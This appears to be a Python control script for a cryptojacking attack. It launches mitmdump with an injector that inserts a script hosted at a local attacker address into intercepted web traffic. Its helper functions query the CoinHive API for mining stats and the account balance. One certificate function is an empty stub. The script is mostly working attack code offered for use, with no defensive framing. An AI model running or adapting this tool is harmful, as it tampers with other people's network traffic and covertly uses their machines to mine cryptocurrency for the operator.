#!/usr/bin/env python3
from OpenSSL import crypto
import json
import load_mitm
import requests
import os

def start_mitm():
    os.system("~/.local/bin/mitmdump -s 'injector.py http://192.168.1.32:8000/script.js' -T")
    return True
    
def get_cert(path, basename):
    ca_path = os.path.join(path, basename + "-ca.pem")
    pass

def get_stats(secret_key, params={}):
    headers = {
        "User-Agent": "bytexmen@mail.com",
        "Content-Type": "application/json"
    }
    params.update(secret=secret_key)
    return requests.get("https://api.coinhive.com/stats/site", params=params, headers=headers).json()

def get_balance(secret_key, params={}):
    headers = {
        "User-Agent": "bytexmen@mail.com",
        "Content-Type": "application/json"
    }
    params.update(secret=secret_key)
    params.update(name="bytexmen@mail.com")
    return requests.get("https://api.coinhive.com/user/balance", params=params, headers=headers).json()
